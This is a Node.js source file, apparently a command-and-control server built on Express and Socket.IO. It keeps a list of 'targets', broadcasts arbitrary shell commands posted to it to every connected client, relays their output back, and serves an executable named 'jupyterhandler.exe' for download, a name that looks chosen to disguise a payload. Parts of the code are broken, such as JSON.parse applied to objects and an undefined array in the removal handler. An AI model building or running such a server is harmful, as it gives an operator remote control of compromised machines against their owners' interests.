const express = require('express');
const bodyParser = require('body-parser');
const app = express();
app.use(bodyParser.json()); // for parsing application/json
app.use(bodyParser.urlencoded({ extended: true }));
const http = require('http');
const server = http.createServer(app);
const { Server } = require('socket.io');
const io = new Server(server);
var targets = []

function removeDuplicates(arr) {
  return arr.filter((item,
      index) => arr.indexOf(item) === index);
}

app.get('/', (req,res)=>{
    res.send("Hello, you...")//<script src='/socket.io/socket.io.js'></script><script>var socket = io();</script>
})

app.get('/d',(req,res)=>{
   var file = __dirname + '/jupyterhandler.exe';
   res.sendFile(file);
})

app.post('/', (req, res) => {
    raw_cmd = req.body.cmd
    io.emit('cmd',raw_cmd)
    res.send('Sent!')
 });

io.on('connection', (socket)=>{
   socket.on('listening',(target)=>{
    if(targets.includes(target)){
    }else{
      for(tar in targets){
        socket.timeout(3000).emit(JSON.parse({"cmd":"echo ping", "target":tar}), (err,response)=>{
          if(err){
  
          }else{
            targets.push(target['target_id'])
            targets = removeDuplicates(targets)
          }
        })
      }
    };
    console.log("Current targets: "+targets)

   })
   socket.on('server-targets',()=>{
    for(tar in targets){
      socket.timeout(5000).emit(JSON.parse({"cmd":"echo ping", "target":tar}), (err,response)=>{
        if(err){

        }else{
          targets.push(tar['target_id'])
          targets = removeDuplicates(targets)
        }
      })
    }
    socket.emit('res_targets',targets)
   })
   socket.on('server-cmd',(cmd)=>{
    console.log("Sending cmd to target")
    io.emit('cmd',cmd)
   })

   socket.on('target-disconnected', (target_id)=>{
    const index = targets.indexOf(target_id);
    if (index > -1) { // only splice array when item is found
      array.splice(index, 1); // 2nd parameter means remove one item only
    }
   })

   socket.on('disconnect',(s)=>{
    //socket.emit('res_targets',targets)
   })

  socket.on('server-cmd_res',(cmd_res)=>{
        cmd_res_mod = JSON.parse(cmd_res)
        cmd_res_mod.targets = targets
        io.emit('cmd_res',JSON.stringify(cmd_res_mod))
  })
})

const PORT = process.env.PORT || 3000

server.listen(PORT, () => {
  console.log('listening on *:'+PORT);
})